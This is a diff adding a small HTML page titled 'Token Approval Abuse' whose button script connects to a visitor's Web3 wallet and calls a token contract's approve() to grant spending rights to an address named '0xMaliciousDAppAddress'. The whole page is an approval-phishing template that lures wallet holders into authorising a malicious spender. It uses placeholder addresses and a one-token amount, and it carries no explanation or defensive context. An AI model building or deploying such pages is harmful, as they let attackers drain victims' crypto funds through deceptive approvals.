@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Token Approval Abuse</title>
+</head>
+<body>
+    <button id="approve">Approve Token</button>
+    <script>
+        const web3 = new Web3(Web3.givenProvider);
+        document.getElementById('approve').onclick = async () => {
+            const accounts = await web3.eth.requestAccounts();
+            const tokenContract = new web3.eth.Contract(ABI, "0xTokenAddress");
+            await tokenContract.methods
+                .approve("0xMaliciousDAppAddress", "1000000000000000000") // Approve 1 token
+                .send({ from: accounts[0] });
+            alert("Approval Request Sent!");
+        };
+    </script>
+</body>
+</html>
